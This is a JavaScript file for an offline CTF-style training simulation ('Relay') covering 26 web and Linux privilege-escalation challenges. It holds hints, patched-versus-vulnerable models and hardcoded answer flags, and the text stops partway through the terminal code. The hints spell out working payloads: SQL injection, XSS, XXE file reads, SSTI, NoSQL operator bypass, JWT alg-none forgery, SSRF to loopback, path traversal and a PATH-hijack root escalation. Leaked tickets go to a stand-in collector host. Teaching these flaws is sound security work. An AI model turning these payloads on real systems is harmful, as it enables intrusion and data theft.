/* Relay is an in-browser training simulation. No commands or network requests run here. */
(function(root){
  'use strict';
  const FLAGS={source:'CTF{comments_are_public}',discovery:'CTF{robots_are_not_guards}',encoding:'CTF{base64_is_not_encryption}',git:'CTF{history_is_a_deployment_secret}',debug:'CTF{stack_traces_cross_boundaries}',traversal:'CTF{canonical_paths_before_reads}',redirect:'CTF{redirects_can_leak_tokens}',trust:'CTF{never_trust_a_client_role}',idor:'CTF{check_the_owner_every_time}',mass:'CTF{bind_only_allowed_fields}',sqli:'CTF{data_must_not_become_sql}',xss:'CTF{encode_for_the_output_context}',csrf:'CTF{cross_site_is_not_consent}',cors:'CTF{origins_need_an_allowlist}',upload:'CTF{an_extension_is_not_content}',ssrf:'CTF{the_server_is_not_your_proxy}',xxe:'CTF{entities_must_not_read_files}',ssti:'CTF{templates_are_code_not_data}',nosql:'CTF{operators_are_not_passwords}',jwt:'CTF{claims_need_verified_signatures}',user:'CTF{first_foothold_on_relay}',capability:'CTF{capabilities_are_privileges}',archive:'CTF{extract_only_inside_the_root}',race:'CTF{check_and_use_must_be_atomic}',cache:'CTF{unkeyed_input_poisons_shared_state}',root:'CTF{privileged_paths_need_trust}'};
  const LAB_PASSWORD='replay-lantern-42'; // Fictional, deliberately discoverable training credential.
  const configuration=JSON.stringify({service:'relay',ssh:{user:'dev',password:LAB_PASSWORD},note:'Fictional training credentials only',flag:FLAGS.encoding},null,2);
  const encode=s=>typeof Buffer!=='undefined'?Buffer.from(s,'utf8').toString('base64'):btoa(unescape(encodeURIComponent(s)));
  const decode=s=>typeof Buffer!=='undefined'?Buffer.from(s,'base64').toString('utf8'):decodeURIComponent(escape(atob(s)));
  const escapeHTML=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  const CHALLENGES=[
    {id:'source',title:'A note left behind',category:'Source inspection',points:100,objective:'Find something a developer left in the Relay homepage source.',hints:['A rendered page is only one view of its HTML.','Use the target browser’s Source tab on /.','Look for an HTML comment.'],lesson:'HTML comments are delivered to the browser. Never put secrets in client-delivered source. Compare the homepage in patched mode: the private comment is removed.',reference:'https://owasp.org/www-project-web-security-testing-guide/'},
    {id:'discovery',title:'The quiet entrance',category:'Reconnaissance',points:100,objective:'Find the staff maintenance route and inspect its access policy.',hints:['What public file tells crawlers where not to go?','Read /robots.txt.','Follow the maintenance path listed there.'],lesson:'robots.txt is public crawler guidance, not access control. Finding a path is a clue; receiving staff-only content without permission proves the issue. In patched mode, the route denies access.',reference:'https://portswigger.net/web-security/access-control'},
    {id:'encoding',title:'Wrapped, not locked',category:'Encoding',points:150,objective:'Recover the readable configuration from an exposed backup.',hints:['The crawler file reveals more than one path.','The backup ends in .b64. Copy the encoded contents.','In the terminal, use decode followed by the Base64 text. Read every field.'],lesson:'Base64 is a reversible representation, not encryption. The defect is exposing a sensitive backup. Remove the public backup and use proper secret storage. This backup contains fictional game credentials.',reference:'https://developer.mozilla.org/en-US/docs/Glossary/Base64'},
    {id:'trust',title:'Who decides your role?',category:'Client trust',points:200,objective:'Test whether the staff portal trusts a role supplied by the client.',hints:['Visit /portal as the seeded user Alice.','Open the target browser’s Storage tab. Inspect the simulated session.','Change the JSON role to admin, apply it, then revisit /portal.'],lesson:'The simulated vulnerable portal trusts the client’s role field. The patched portal derives the role from a trusted account record. The session editor is part of the fictional target; it never edits your real browser cookies.',reference:'https://portswigger.net/web-security/access-control'},
    {id:'idor',title:'The other invoice',category:'Access control',points:250,objective:'Keep Alice’s identity and test the boundary around another user’s invoice.',hints:['Read /api/invoices/101 as a baseline.','Keep the user Alice. Change only the identifier to 102.','Compare the owner and private content; repeat in patched mode.'],lesson:'Authentication does not grant access to every object. The vulnerable route omits ownership checks. The patched route denies Alice access to Bob’s invoice while allowing Alice to read invoice 101.',reference:'https://portswigger.net/web-security/access-control'},
    {id:'sqli',title:'A filter with a hole',category:'SQL injection model',points:250,objective:'Make the product filter return a hidden training record.',hints:['Start with /api/products?category=books.','The displayed model joins the category into a quoted SQL value.','Try /api/products?category=books%27%20OR%201%3D1-- .'],lesson:'This is a simplified query model, not a real SQL engine. The quote changes the modelled query structure; OR 1=1 bypasses the filter. The patched model keeps the supplied value as data, representing a parameterised query.',reference:'https://portswigger.net/web-security/sql-injection'},
    {id:'user',title:'A foothold',category:'Simulated shell',points:300,objective:'Use the recovered training credentials to access dev’s home directory and capture user.txt.',hints:['Decode the exposed configuration first. It contains a seeded SSH account.','In the simulated terminal, run ssh dev@relay.box and enter the fictional password when prompted.','Explore with pwd and ls -la. Read user.txt with cat.'],lesson:'The simulated foothold comes from an exposed reusable credential. Fix the exposure and rotate affected credentials. An encoding layer is not a security boundary. This terminal does not connect to SSH or execute real programs.',reference:'https://owasp.org/www-project-web-security-testing-guide/'},
    {id:'root',title:'The backup’s blind spot',category:'Privilege model',points:400,objective:'Inspect the backup permission and its command lookup, then capture root.txt in the simulation.',hints:['After the foothold, run sudo -l, then read /usr/local/bin/relay-backup.','Its PATH searches /home/dev/bin before trusted directories. The backup invokes tar without an absolute path.','Create the simulated helper with: write /home/dev/bin/tar cat /root/root.txt . Then chmod +x /home/dev/bin/tar and sudo /usr/local/bin/relay-backup.'],lesson:'The privileged model searches a user-writable directory for tar. The patched backup fixes PATH and calls a trusted absolute path. Restrict privileged helpers, constrain their environment, and protect the directories used for command lookup.',reference:'https://owasp.org/www-project-web-security-testing-guide/'}
  ];
  const extra=[
    ['git','A deployment with a past','Exposed Git metadata','Recover a release secret from publicly deployed version-control metadata.',['Visit /.git/HEAD. Follow the named branch ref.','Read /.git/refs/heads/main, then /.git/logs/HEAD.','The release message in the reflog contains the flag.'],'Deploy build outputs, not source-control internals. The model exposes a Git reflog; the patched deployment blocks the entire /.git/ prefix.','information-disclosure'],
    ['debug','An error says too much','Verbose error disclosure','Trigger a diagnostic trace and distinguish a useful error from a leaked secret.',['Start with /api/debug.','The endpoint accepts the trace query switch.','Visit /api/debug?trace=true. Inspect the environment line.'],'Detailed errors belong in protected logs. This exercise leaks an environment value through an exception trace; the patch returns only a request ID.','information-disclosure'],
    ['traversal','Outside the download folder','Path traversal read','Read a configuration file outside the allowed download directory.',['Start with /download?file=handbook.txt. The base is /srv/relay/downloads.','Normalise ../../config/service.env relative to that directory.','Visit /download?file=../../config/service.env.'],'The vulnerable model resolves a user path without enforcing its final directory. The fix checks the canonical path stays under the allowed root before reading.','file-path-traversal'],
    ['redirect','A token on the wrong doorstep','Open redirect token leak','Redirect a fictional login ticket to the local collector and prove delivery.',['Visit /login/continue?return_to=/portal as a baseline.','The collector is https://collector.invalid/capture. It is virtual; no request is sent.','Set return_to to that full URL, then visit /collector to read the captured ticket.'],'An arbitrary post-login redirect leaks a fictional ticket. Restrict return destinations to approved relative routes and avoid putting sensitive tokens in URLs.','oauth'],
    ['mass','A field that was never yours','Mass assignment','Upgrade a profile using an extra server-owned JSON property.',['Read /api/profile. Find the editable and server-owned fields.','Use the Request tab: POST /api/profile, JSON body with displayName and plan.','Submit {"displayName":"Alice","plan":"staff"}. Then GET /api/profile.'],'Binding every submitted property lets a user overwrite a server-owned subscription field. The patched model allows only displayName; authorisation governs plan changes.','api-testing'],
    ['xss','When a search becomes markup','Reflected XSS model','Move a harmless marker from reflected data into an executable HTML context.',['Visit /search?q=hello and inspect Source for the sink.','This model recognises one harmless payload; it never executes scripts.','Use /search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E.'],'The model detects an event-handler payload reaching an unescaped HTML sink and awards a flag. The actual page shows inert text. The patch uses context-appropriate output encoding.','cross-site-scripting'],
    ['csrf','The request Alice never intended','CSRF model','Change a fictional email through a cross-origin request without a CSRF token.',['GET /api/email documents the baseline and token.','In Request, POST /api/email. Put Origin in the JSON headers; it models a cross-site form.','Headers: {"Origin":"https://collector.invalid"}. Body: {"email":"learner@collector.invalid"}.'],'The model automatically attaches Alice’s seeded session but accepts a cross-origin state change without intent verification. The patched endpoint validates Origin and a session-bound CSRF token.','csrf'],
    ['cors','Private data, public origin','CORS credentialed read','Read a private model response from an untrusted origin.',['GET /api/private returns data only to the trusted origin by default.','Use Request GET /api/private with an Origin header.','Headers: {"Origin":"https://collector.invalid"}. The model treats this as a credentialed browser read.'],'Reflecting arbitrary origins while allowing credentials exposes private responses. The patched model uses an exact allowlist. This UI models browser readability; it does not make cross-origin requests.','cors'],
    ['upload','The image that carries code','Unsafe upload content','Bypass the image policy using a permitted extension with active content.',['GET /api/upload describes a filename-only policy and modelled content sniffing.','POST /api/upload with filename avatar.jpg and SVG content.','Body: {"filename":"avatar.jpg","content":"<svg onload=alert(1)>"}.'],'The model accepts a .jpg name while sniffing active SVG as HTML-capable content. The flag represents unsafe serving. The patch decodes and re-encodes raster images and rejects active formats. No file is uploaded or script run.','file-upload'],
    ['ssrf','A preview of the inside','SSRF internal service','Make the preview service reach a loopback-only training resource.',['GET /preview?url=https://docs.relay.invalid/handbook is the public baseline.','GET /service-map describes an internal listener on 127.0.0.1:9000.','Use /preview?url=http://127.0.0.1:9000/internal/status.'],'The vulnerable preview model follows a supplied URL into a private service. The patch restricts destinations to an explicit public allowlist. Real defences must also address DNS resolution and redirects.','ssrf'],
    ['xxe','An XML document with a visitor','XXE file read model','Use an external entity in the stock-check XML model to read a configuration file.',['GET /api/stock documents the XML field in the JSON request wrapper.','POST /api/stock with xml containing a DOCTYPE and SYSTEM file entity.','Body: {"xml":"<!DOCTYPE stock [<!ENTITY xxe SYSTEM \'file:///etc/relay/stock.key\'>]><stock>&xxe;</stock>"}.'],'The simplified parser model resolves a file entity and reflects its contents. The patch disables DTDs and external entity resolution. No real XML parser or filesystem is accessed.','xxe'],
    ['ssti','The greeting that computes','Server-side template injection','First prove expression evaluation, then read a modelled template configuration value.',['Visit /render?name=%7B%7B7*7%7D%7D. A result of 49 models evaluation.','GET /template/help lists the only supported expressions.','Use /render?name=%7B%7Bconfig.signing_key%7D%7D.'],'Untrusted text is modelled as template source. After an arithmetic probe, the learner reads a template-accessible secret. The patched model passes name as data into a fixed template. This is not an actual template engine.','server-side-template-injection'],
    ['nosql','A password that is an operator','NoSQL operator injection','Turn a login password value into an operator and retrieve the admin record.',['GET /api/login describes the seeded query shape.','POST /api/login with username admin and a non-scalar password.','Body: {"username":"admin","password":{"$ne":null}}.'],'The vulnerable model allows a password object to become a query operator. The patch validates scalar types and checks the actual password. No real database or login exists.','nosql-injection'],
    ['jwt','A signature nobody checked','JWT unsigned-token acceptance','Forge the modelled admin claim by choosing an unsigned JWT algorithm.',['GET /api/token returns a seeded user JWT and the verification policy.','Use the simulated command jwt-none {"sub":"alice","role":"admin"} to encode an unsigned training token.','GET /api/token/admin with JSON headers {"Authorization":"Bearer <generated token>"}.'],'The vulnerable verifier accepts alg none and trusts the role claim. The patched verifier pins the allowed algorithm and rejects unsigned tokens. The helper performs Base64url encoding, not cryptographic signing.','jwt'],
    ['capability','A binary with an extra power','Linux capability file read','Inspect a special capability and use the modelled reader to access a protected file.',['After the SSH foothold, run getcap -r /.','Inspect /usr/local/bin/relay-read with cat. It models cap_dac_read_search.','Run relay-read /root/capability.txt.'],'cap_dac_read_search can bypass ordinary file-read permission checks. Assign capabilities narrowly and treat capable binaries as privileged. Patched mode removes this capability. This is a file-read model, not a native binary.','access-control'],
    ['archive','An export that escapes its folder','Archive extraction write','Use a malicious archive member to overwrite a modelled release file outside the extraction root.',['GET /api/archive documents the /srv/relay/imports extraction root and accepts an entries array.','POST a member named ../release/manifest.json containing {"approved":true}.','Body: {"entries":[{"name":"../release/manifest.json","content":"{\\"approved\\":true}"}]}. Then GET /api/release.'],'A traversal inside an archive becomes an arbitrary write outside the extraction directory. The model uses that write to forge a release manifest. Patched extraction rejects escaping names before any writes.','file-path-traversal'],
    ['race','One coupon, two winners','Race condition state machine','Schedule two requests that both pass a stale eligibility check before either commits.',['GET /api/coupon shows a one-use coupon and balance. A sequential redemption grants no flag.','Use POST /api/coupon/check twice to obtain two pending request IDs.','POST /api/coupon/commit with {"id":"r1"}, then {"id":"r2"}. GET /api/coupon to prove balance 200.'],'This deterministic concurrency model separates check and commit. Two stale approvals produce two credits from one coupon. The patched model atomically rechecks and consumes the coupon at commit. Use Reset exercise state before replaying.','race-conditions'],
    ['cache','A shared response with your host','Web cache poisoning chain','Poison an unkeyed header in the cached release page, then observe a separate virtual victim consume it.',['GET /api/cache explains its key and the virtual victim. Reset exercise state before trying a new key.','GET /release-notes?edition=ctf26 with headers {"X-Forwarded-Host":"collector.invalid"} primes the cache.','POST /api/cache/victim with {"edition":"ctf26"}, then GET /collector. The captured release proof also supplies the final backup ticket.'],'An unkeyed header changes cached content while the cache key omits that input. A distinct simulated victim loads the shared poisoned response. The patch fixes the canonical host and prevents the collector callback. No real victim or external traffic is involved.','web-cache-poisoning']
  ];
  for(const [id,title,category,objective,hints,lesson,topic] of extra)CHALLENGES.push({id,title,category,objective,hints,lesson,reference:'https://portswigger.net/web-security/'+topic});
  const order=['source','discovery','encoding','git','debug','traversal','redirect','trust','idor','mass','sqli','xss','csrf','cors','upload','ssrf','xxe','ssti','nosql','jwt','user','capability','archive','race','cache','root'];
  CHALLENGES.sort((a,b)=>order.indexOf(a.id)-order.indexOf(b.id));
  CHALLENGES.forEach((c,i)=>{c.points=100+i*50;c.level=i<6?'Beginner':i<12?'Apprentice':i<18?'Intermediate':i<23?'Advanced':'Expert';});
  CHALLENGES.find(c=>c.id==='root').objective='Chain the poisoned release proof with a privileged helper’s unsafe PATH to capture the final root flag.';
  CHALLENGES.find(c=>c.id==='root').hints=['Finish the cache-poisoning exercise. Its collector response contains a backup ticket. Then inspect sudo -l and /usr/local/bin/relay-backup.','Create the simulated helper: write /home/dev/bin/tar cat /root/root.txt . Then chmod +x /home/dev/bin/tar.','Run sudo /usr/local/bin/relay-backup --ticket relay-release-26 after the virtual cache victim has delivered the release proof.'];
  const homepage=()=>`<!doctype html>\n<html>\n<head><title>Relay staff services</title></head>\n<body>\n<h1>Relay staff services</h1>\n<p>Training portal for internal staff and invoice support.</p>\n<a href="/portal">Staff portal</a>\n<a href="/api/invoices/101">My invoice</a>\n<a href="/api/products?category=books">Product catalogue</a>\n<!-- release checklist: remove temporary note ${FLAGS.source} -->\n</body>\n</html>`;
  const FILES={
    '/home/dev/user.txt':FLAGS.user+'\n',
    '/home/dev/README.txt':'Relay operations notes\nCheck the backup permissions before the next release.\nThe dev account can write to /home/dev/bin.\n',
    '/home/dev/.profile':'export PATH=/home/dev/bin:/usr/bin:/bin\n',
    '/usr/local/bin/relay-backup':'#!/bin/sh\n# sudo allows dev to run this backup helper as root.\nexport PATH=/home/dev/bin:/usr/bin:/bin\ncd /srv/relay\ntar -czf /var/backups/relay.tar.gz .\n',
    '/root/root.txt':FLAGS.root+'\n',
    '/etc/hostname':'relay\n',
    '/etc/passwd':'root:x:0:0:root:/root:/bin/sh\ndev:x:1000:1000:Relay developer:/home/dev:/bin/sh\n',
    '/srv/relay/README.txt':'Fictional Relay web service.\nNo actual services run on 10.10.10.42.\n'
  };
  FILES['/usr/local/bin/relay-read']='Capability model: cap_dac_read_search=ep\nUsage: relay-read /root/capability.txt\nReads files despite ordinary discretionary read permissions.\n';
  FILES['/root/capability.txt']=FLAGS.capability+'\n';
  const freshModel=()=>({profile:{displayName:'Alice',plan:'basic'},email:'alice@relay.invalid',collector:[],archiveApproved:false,balance:0,used:false,pending:{},nextId:1,cache:{},releaseTicket:false});
  function normalize(path,cwd='/home/dev'){
    const parts=(path.startsWith('/')?path:cwd+'/'+path).split('/');const out=[];
    for(const p of parts){if(p==='..')out.pop();else if(p&&p!=='.')out.push(p);}return '/'+out.join('/');
  }
  function target(path,session,patched=false,model=freshModel(),options={}){
    if(typeof path!=='string'||!path.startsWith('/')||path.startsWith('//'))return {status:400,type:'json',body:{error:'Use a relative path inside the fictional target.'}};
    let url;try{url=new URL(path,'https://relay.invalid');}catch{return {status:400,type:'json',body:{error:'Invalid target path'}};}
    const result=(status,type,body)=>({status,type,body,headers:{'X-Target':'Relay training simulation','Content-Type':type==='html'?'text/html':type==='text'?'text/plain':'application/json'}});
    const method=String(options.method||'GET').toUpperCase();
    const body=options.body||{};const headers={};for(const [k,v] of Object.entries(options.headers||{}))headers[k.toLowerCase()]=String(v);
    const json=(status,body)=>result(status,'json',body),text=body=>result(200,'text',body);
    const origin=headers.origin||'https://relay.box';
    if(url.pathname==='/collector')return json(200,{simulation:'Local collector: no external callbacks.',captures:model.collector});
    if(url.pathname.startsWith('/.git/')){
      if(patched)return json(403,{error:'Version-control files excluded from deployment'});
      if(url.pathname==='/.git/HEAD')return text('ref: refs/heads/main\n');
      if(url.pathname==='/.git/refs/heads/main')return text('0123456789abcdef0123456789abcdef01234567\nSee /.git/logs/HEAD for release history.');
      if(url.pathname==='/.git/logs/HEAD')return text('release-bot: deployment note '+FLAGS.git+'\n');
    }
    if(url.pathname==='/api/debug')return url.searchParams.get('trace')==='true'&&!patched?json(500,{error:'TraceError at config.load (/app/config.js:42)',environment:{DEBUG_RELEASE_TOKEN:FLAGS.debug}}):json(500,{error:'Diagnostic request failed',request_id:'relay-error-05',help:'Development query switch: trace=true'});
    if(url.pathname==='/download'){
      const file=url.searchParams.get('file')||'handbook.txt';const resolved=normalize(file,'/srv/relay/downloads');
      if(patched&&!resolved.startsWith('/srv/relay/downloads/'))return json(403,{error:'Canonical path is outside download root'});
      return resolved==='/srv/config/service.env'?text('SERVICE_KEY='+FLAGS.traversal):resolved==='/srv/relay/downloads/handbook.txt'?text('Relay handbook. Download base: /srv/relay/downloads. Service config: /srv/config/service.env.'):json(404,{error:'Modelled download file not found',resolved});
    }
    if(url.pathname==='/login/continue'){
      const dest=url.searchParams.get('return_to')||'/portal';
      if(dest==='https://collector.invalid/capture'&&!patched){model.collector.push({kind:'redirect-ticket',ticket:FLAGS.redirect});return json(302,{location:dest+'?ticket=[captured]',help:'Read /collector to prove delivery.'});}
      if(!dest.startsWith('/')||dest.startsWith('//'))return json(400,{error:'Return destination must be an allowed relative route'});
      return json(302,{location:dest});
    }
    if(url.pathname==='/api/profile'){
      if(method==='POST'){if(typeof body.displayName==='string')model.profile.displayName=body.displayName.slice(0,80);if(!patched&&body.plan==='staff')model.profile.plan='staff';return json(200,{updated:true,allowed_fields:patched?['displayName']:['all submitted properties']});}
      return json(200,{...model.profile,editable:['displayName'],server_owned:['plan'],...(model.profile.plan==='staff'?{flag:FLAGS.mass}:{})});
    }
    if(url.pathname==='/search'){
      const q=url.searchParams.get('q')||'';const triggered=/<img\s+src=x\s+onerror=alert\(1\)>/i.test(q);
      return text(JSON.stringify({simulation:'Inert reflected-XSS model. No script executes.',sink:patched?'textContent = query':'innerHTML = query',query:q,context:'HTML element body',execution_model:!patched&&triggered?'event-handler reached executable context':'no modelled execution',...(!patched&&triggered?{flag:FLAGS.xss}:{})},null,2));
    }
    if(url.pathname==='/api/email'){
      if(method==='POST'){
        if(patched&&(origin!=='https://relay.box'||headers['x-csrf-token']!=='relay-csrf-13'))return json(403,{error:'Origin or CSRF token rejected'});
        if(typeof body.email!=='string')return json(400,{error:'email string required'});
        model.email=body.email;return json(200,{email:model.email,session:'Seeded Alice session attached by the model',...(!patched&&origin==='https://collector.invalid'?{flag:FLAGS.csrf}:{})});
      }
      return json(200,{email:model.email,csrf_token:'relay-csrf-13',help:'POST email; model headers Origin and X-CSRF-Token'});
    }
    if(url.pathname==='/api/private'){
      if(patched&&origin!=='https://relay.box')return json(403,{error:'Untrusted origin; browser-read model denied'});
      return json(200,{allow_origin:origin,allow_credentials:true,browser_readable:true,private_note:'Fictional account data',...(!patched&&origin==='https://collector.invalid'?{flag:FLAGS.cors}:{})});
    }
    if(url.pathname==='/api/upload'){
      if(method!=='POST')return json(200,{help:'POST JSON filename and content. Vulnerable policy: .jpg extension, sniff actual format, serve inline. Modelled active content only.'});
      if(typeof body.filename!=='string'||typeof body.content!=='string')return json(400,{error:'filename and content strings required'});
      const active=/<svg\s+onload=alert\(1\)>/i.test(body.content);
      if(!body.filename.endsWith('.jpg')||patched&&active)return json(415,{error:'Upload format rejected'});
      return json(200,{accepted:true,served_format:active?'image/svg+xml':'image/jpeg',simulation:'No bytes uploaded or rendered',...(!patched&&active?{flag:FLAGS.upload}:{})});
    }
    if(url.pathname==='/service-map')return json(200,{public:'docs.relay.invalid/handbook',internal:'http://127.0.0.1:9000/internal/status',note:'Internal listener inaccessible from virtual client; reachable to preview model.'});
    if(url.pathname==='/preview'){
      const dest=url.searchParams.get('url')||'';
      if(dest==='https://docs.relay.invalid/handbook')return text('Public Relay documentation preview. See /service-map.');
      if(dest==='http://127.0.0.1:9000/internal/status')return patched?json(403,{error:'Destination outside public allowlist'}):json(200,{source:'Loopback internal service',flag:FLAGS.ssrf});
      return json(400,{error:'Destination not defined in this offline model'});
    }
    if(url.pathname==='/api/stock'){
      if(method!=='POST')return json(200,{help:'POST JSON xml wrapping the stock document.',example:'<stock>handbook</stock>',config_file:'/etc/relay/stock.key'});
      const xml=typeof body.xml==='string'?body.xml:'';
      if(patched&&/<!DOCTYPE|<!ENTITY/i.test(xml))return json(400,{error:'DTDs and external entities disabled'});
      const entity=xml.match(/<!ENTITY\s+(\w+)\s+SYSTEM\s+["']file:\/\/\/etc\/relay\/stock\.key["']\s*>/i);
      return json(200,{simulation:'Simplified XML entity model',stock:!patched&&/<!DOCTYPE/i.test(xml)&&entity&&xml.includes('&'+entity[1]+';')?FLAGS.xxe:'Handbook: 12'});
    }
    if(url.pathname==='/template/help')return json(200,{expressions:['{{7*7}}','{{config.signing_key}}'],help:'Probe arithmetic before reading config in /render?name='});
    if(url.pathname==='/render'){
      const name=url.searchParams.get('name')||'Alice';
      return text('Hello '+(!patched&&name==='{{7*7}}'?'49':!patched&&name==='{{config.signing_key}}'?FLAGS.ssti:name)+'!\nTemplate model only. See /template/help.');
    }
    if(url.pathname==='/api/login'){
      if(method!=='POST')return json(200,{query:'findOne({username: submitted.username, password: submitted.password})',help:'POST username and password JSON. Seeded admin password is unknown.'});
      if(patched&&(typeof body.username!=='string'||typeof body.password!=='string'))return json(400,{error:'Login fields must be strings'});
      const injected=body.username==='admin'&&body.password&&typeof body.password==='object'&&Object.hasOwn(body.password,'$ne')&&body.password.$ne===null;
      return !patched&&injected?json(200,{user:'admin',flag:FLAGS.nosql}):json(401,{error:'Login rejected'});
    }
    if(url.pathname==='/api/token')return json(200,{token:jwtNone({sub:'alice',role:'user'}).replace(/\.$/,'.seeded-signature'),policy:patched?'HS256 signature verification required':'Header-selected algorithm accepted',help:'Use jwt-none JSON in simulated terminal. Pass a Bearer token to /api/token/admin.'});
    if(url.pathname==='/api/token/admin'){
      try{const token=(headers.authorization||'').replace(/^Bearer\s+/i,'');const parts=token.split('.');if(parts.length!==3)throw Error();const head=JSON.parse(decodeURL(parts[0])),claims=JSON.parse(decodeURL(parts[1]));if(!patched&&head.alg==='none'&&parts[2]===''&&claims.sub==='alice'&&claims.role==='admin')return json(200,{role:'admin',flag:FLAGS.jwt});}catch{}
      return json(403,{error:'Token verification failed or admin role absent'});
    }
    if(url.pathname==='/api/archive'){
      if(method!=='POST')return json(200,{extraction_root:'/srv/relay/imports',release_manifest:'/srv/relay/release/manifest.json',help:'POST entries: [{name,content}]. Then GET /api/release.'});
      if(!Array.isArray(body.entries)||body.entries.length>20||body.entries.some(e=>!e||typeof e.name!=='string'||typeof e.content!=='string'))return json(400,{error:'A bounded entries array with name and content strings is required'});
      const entries=body.entries.map(e=>({name:String(e.name||''),content:String(e.content||''),resolved:normalize(String(e.name||''),'/srv/relay/imports')}));
      if(patched&&entries.some(e=>!e.resolved.startsWith('/srv/relay/imports/')))return json(400,{error:'Archive member escapes extraction root; no writes performed'});
      for(const e of entries)if(e.resolved==='/srv/relay/release/manifest.json'){try{model.archiveApproved=JSON.parse(e.content).approved===true;}catch{}}
      return json(200,{extracted:entries.map(e=>e.resolved),simulation:'Virtual archive; no filesystem writes'});
    }
    if(url.pathname==='/api/release')return json(200,{approved:model.archiveApproved,...(model.archiveApproved?{flag:FLAGS.archive}:{})});
    if(url.pathname==='/api/coupon/check'){
      if(method!=='POST')return json(405,{error:'POST required'});
      if(model.used)return json(409,{error:'Coupon already used'});
      const id='r'+model.nextId++;model.pending[id]={eligible:true};return json(200,{id,eligible:true,note:'Paused before commit. POST /api/coupon/commit with this id.'});
    }
    if(url.pathname==='/api/coupon/commit'){
      if(method!=='POST')return json(405,{error:'POST required'});
      const pending=model.pending[body.id];if(!pending)return json(400,{error:'Unknown or already committed request'});
      delete model.pending[body.id];if(patched&&model.used)return json(409,{error:'Atomic commit rejected reused coupon'});
      model.used=true;model.balance+=100;return json(200,{balance:model.balance});
    }
    if(url.pathname==='/api/coupon')return json(200,{coupon:'RELAY100',used:model.used,balance:model.balance,help:'POST check, then POST commit with id. Model concurrent requests by checking twice before committing.',...(model.balance>=200?{flag:FLAGS.race}:{})});
    if(url.pathname==='/api/cache')return json(200,{cache_key:'pathname + edition (X-Forwarded-Host omitted)',page:'/release-notes?edition=YOUR_KEY',victim:'POST /api/cache/victim {"edition":"YOUR_KEY"}',help:'Prime the cache, then ask the distinct virtual victim to load it. Inspect /collector.'});
    if(url.pathname==='/release-notes'){
      const edition=url.searchParams.get('edition')||'stable';const hit=Object.hasOwn(model.cache,edition);
      if(!hit)model.cache[edition]={host:patched?'relay.box':headers['x-forwarded-host']||'relay.box'};
      return json(200,{cache:hit?'HIT':'MISS',edition,asset_origin:'https://'+model.cache[edition].host,help:'Virtual page uses this origin for its release proof callback.'});
    }
    if(url.pathname==='/api/cache/victim'){
      if(method!=='POST')return json(405,{error:'POST required'});
      const record=model.cache[String(body.edition||'stable')];
      if(!record)return json(404,{error:'Cache is not primed for this edition'});
      if(!patched&&record.host==='collector.invalid'){model.releaseTicket=true;model.collector.push({kind:'cache-victim',flag:FLAGS.cache,backup_ticket:'relay-release-26'});return json(200,{victim:'Distinct seeded release operator',consumed:'Poisoned shared response',help:'Read /collector.'});}
      return json(200,{victim:'Distinct seeded release operator',consumed:'Canonical release page',callback:'relay.box'});
    }
    if(method!=='GET')return json(405,{error:'This route only supports GET in the model'});
    const role=patched?'user':session.role;
    if(url.pathname==='/')return result(200,'html',patched?homepage().replace(/<!--.*?-->/g,''):homepage());
    if(url.pathname==='/robots.txt')return result(200,'text','User-agent: *\nDisallow: /maintenance\nDisallow: /backup/app-config.b64\n');
    if(url.pathname==='/maintenance')return patched?result(403,'json',{error:'Staff role required'}):result(200,'html',`<h1>Maintenance console</h1><p>Staff-only release note.</p><pre>${FLAGS.discovery}</pre>`);
    if(url.pathname==='/backup/app-config.b64')return patched?result(403,'json',{error:'Public backup access disabled'}):result(200,'text',encode(configuration));
    if(url.pathname==='/portal')return role==='admin'?result(200,'html',`<h1>Staff control panel</h1><p>The target trusted your client-controlled role.</p><pre>${FLAGS.trust}</pre>`):result(403,'html','<h1>Staff only</h1><p>Alice is signed in as a regular user. Staff access requires the admin role.</p>');
    if(url.pathname.startsWith('/api/invoices/')){
      const id=url.pathname.split('/').pop();const records={'101':{id:101,owner:'alice',item:'Training handbook',credits:100},'102':{id:102,owner:'bob',item:'Private fictional coaching',credits:240,flag:FLAGS.idor}};
      const record=records[id];if(!record)return result(404,'json',{error:'Invoice not found'});
      if(patched&&record.owner!=='alice')return result(403,'json',{error:'Alice does not own this invoice'});
      return result(200,'json',record);
    }
    if(url.pathname==='/api/products'){
      const category=url.searchParams.get('category')||'';
      const normal=[{name:'HTTP handbook',category:'books',hidden:false}];
      const injection=/['"]\s*or\s+1\s*=\s*1\s*--/i.test(category);
      const products=!patched&&injection?[...normal,{name:'Unreleased training kit',category:'internal',hidden:true,flag:FLAGS.sqli}]:category==='books'?normal:[];
      return result(200,'json',{simulation:'Simplified query model; no database runs here.',query:patched?'SELECT * FROM products WHERE category = ? AND hidden = 0':`SELECT * FROM products WHERE category = '${category}' AND hidden = 0`,bound_value:patched?category:null,products});
    }
    return result(404,'json',{error:'Route not found in the Relay simulation'});
  }
  function decodeURL(s){return decode(s.replace(/-/g,'+').replace(/_/g,'/')+'='.repeat((4-s.length%4)%4));}
  function jwtNone(claims){const enc=s=>encode(s).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');return enc(JSON.stringify({alg:'none',typ:'JWT'}))+'.'+enc(JSON.stringify(claims))+'.';}
  class Box {
    constructor(saved={}){this.user=saved.user==='dev'?'dev':'guest';this.cwd=normalize(saved.cwd||'/home/dev');this.files={...FILES};this.executable=new Set();this.passwordPrompt=false;this.patched=false;this.session={user:'alice',role:'user'};this.model=freshModel();}
    execute(raw){
      const text=String(raw).trim();
      if(this.passwordPrompt){this.passwordPrompt=false;if(text===LAB_PASSWORD&&!this.patched){this.user='dev';this.cwd='/home/dev';return {output:'Authenticated to the simulated box.\nWelcome, dev. Start with pwd, ls -la, and cat user.txt.',secret:true};}return {output:this.patched?'Permission denied. The recovered credential has been rotated in patched mode.':'Permission denied. Check the decoded training configuration.',secret:true};}
      if(!text)return {output:''};
      const [cmd,...args]=text.split(/\s+/);const output=s=>({output:s});
